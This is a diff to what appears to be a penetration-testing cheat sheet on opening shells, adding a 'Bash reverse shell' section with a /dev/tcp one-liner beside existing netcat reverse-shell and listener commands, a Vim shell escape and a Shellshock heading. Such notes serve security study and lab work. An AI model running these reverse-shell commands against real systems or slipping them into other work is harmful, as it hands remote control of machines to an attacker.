@@ -5,7 +5,8 @@
 ## Opening a shell
 1. Vim : !/bin/bash
 2. netcat reverse shell _(see below)_
-3. Bash shellshock, in cgi and sometimes [ssh](https://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/)
+3. Bash reverse shell
+4. Bash shellshock, in cgi and sometimes [ssh](https://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/)
 
 * list binaries with SUID bit set:
 
@@ -20,6 +21,9 @@ On the target machine shell : `nc <host> <any port> -e /bin/bash`
 
 On your machine: `nc -lvp <port no>`
 
+#### Bash reverse shell
+
+      bash -i >& /dev/tcp/<ip>/4444 0>&1
 #### Bash shellshock
 
 Test if vulnerable:
